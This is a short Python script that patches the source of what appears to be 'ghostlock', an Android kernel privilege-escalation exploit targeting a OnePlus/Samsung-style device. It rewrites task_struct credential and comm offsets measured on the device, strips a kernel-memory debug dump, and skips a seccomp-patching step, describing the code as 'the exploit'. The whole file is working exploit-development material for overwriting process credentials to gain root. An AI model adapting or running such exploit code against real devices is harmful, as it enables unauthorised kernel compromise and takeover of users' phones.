#!/usr/bin/env python3
import sys, os
CORE = os.path.expanduser("~/ghostlock/ghostlock-oneplus/src/core")

def patch(path, old, new, cnt=1):
    p = os.path.join(CORE, path)
    s = open(p, encoding="utf-8").read()
    if s.count(old) != cnt:
        print("FAIL %s: %d (want %d): %r" % (path, s.count(old), cnt, old[:90])); sys.exit(1)
    open(p, "w", encoding="utf-8").write(s.replace(old, new))
    print("ok  %s" % path)

# 1. device cred/comm offsets: measured on device (+8 vs the OSRC build)
patch("../devices/beyond0q/offsets.h",
      "  .task_atomic_flags = 0x670, .task_real_cred = 0x848, .task_cred = 0x850,\n"
      "  .task_comm = 0x858, .task_tasks = 0x5A8, .task_seccomp = 0x8F8,\n",
      "  .task_atomic_flags = 0x670, .task_real_cred = 0x850, .task_cred = 0x858,\n"
      "  .task_comm = 0x860, .task_tasks = 0x5A8, .task_seccomp = 0x8F8,\n")

# 2. root.c: drop the noisy per-word dump
F = os.path.join(CORE, "root.c")
s = open(F, encoding="utf-8").read()
old = """  for (uintptr_t off = 0x828; off <= 0x870; off += 8)
    pr_info("root task[%03zx]=%016llx", (size_t)off,
            (unsigned long long)pipe_read64(fd, current_task_addr + off));
"""
if s.count(old) != 1:
    print("FAIL dump: %d" % s.count(old)); sys.exit(1)
s = s.replace(old, "")

# 3. skip the seccomp patch (the exploit runs with Seccomp=0, and those offsets
#    are also affected by the +8 layout shift)
old2 = """  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\\n",
            (unsigned long long)current_task_addr);
    return 0;
  }
"""
new2 = """  /* Seccomp patch skipped: this exploit runs Seccomp=0 and the seccomp field
   * offsets are subject to the same +8 task_struct layout shift. */
"""
if s.count(old2) != 1:
    print("FAIL seccomp: %d" % s.count(old2)); sys.exit(1)
s = s.replace(old2, new2)

open(F, "w", encoding="utf-8").write(s)
print("done")
